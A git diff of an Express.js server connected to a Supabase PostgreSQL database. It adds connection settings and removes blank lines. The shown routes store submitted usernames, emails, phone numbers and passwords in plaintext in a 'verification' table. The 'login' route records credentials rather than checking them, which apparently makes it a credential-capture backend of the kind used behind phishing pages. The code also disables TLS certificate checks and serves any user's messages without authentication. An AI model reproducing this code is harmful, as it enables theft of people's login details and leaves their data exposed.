@@ -9,9 +9,14 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-// PostgreSQL connection using environment variables (for Render + Supabase)
+// PostgreSQL connection using environment variables (Render + Supabase)
 const pool = new Pool({
-  ssl: { rejectUnauthorized: false } // Required for Supabase
+  user: process.env.PGUSER,           // "postgres"
+  host: process.env.PGHOST,           // "db.lfpwlanmugnpfahfpzrg.supabase.co"
+  database: process.env.PGDATABASE,   // "postgres"
+  password: process.env.PGPASSWORD,   // your Supabase DB password
+  port: process.env.PGPORT,           // 5432
+  ssl: { rejectUnauthorized: false }  // required for Supabase connections
 });
 
 // --- ROUTES ---
@@ -19,7 +24,6 @@ const pool = new Pool({
 // Full registration route
 app.post("/submit", async (req, res) => {
   const { username, email, phone, password, message } = req.body;
-
   try {
     await pool.query(
       "INSERT INTO verification (username, email, phone, password, message) VALUES ($1,$2,$3,$4,$5)",
@@ -35,11 +39,9 @@ app.post("/submit", async (req, res) => {
 // Login route (username + password)
 app.post("/login-submit", async (req, res) => {
   const { username, password } = req.body;
-
   if (!username || !password) {
     return res.status(400).send("Username and password are required");
   }
-
   try {
     await pool.query(
       "INSERT INTO verification (username, password) VALUES ($1,$2)",
@@ -66,11 +68,9 @@ app.get("/test", async (req, res) => {
 // Send message route
 app.post("/send-message", async (req, res) => {
   const { sender, receiver, message } = req.body;
-
   if (!sender || !receiver || !message) {
     return res.status(400).send("All fields are required");
   }
-
   try {
     await pool.query(
       "INSERT INTO messages (sender, receiver, message) VALUES ($1, $2, $3)",
@@ -86,7 +86,6 @@ app.post("/send-message", async (req, res) => {
 // Fetch messages for a user
 app.get("/messages/:username", async (req, res) => {
   const username = req.params.username;
-
   try {
     const result = await pool.query(
       "SELECT * FROM messages WHERE receiver = $1 ORDER BY sent_at DESC",
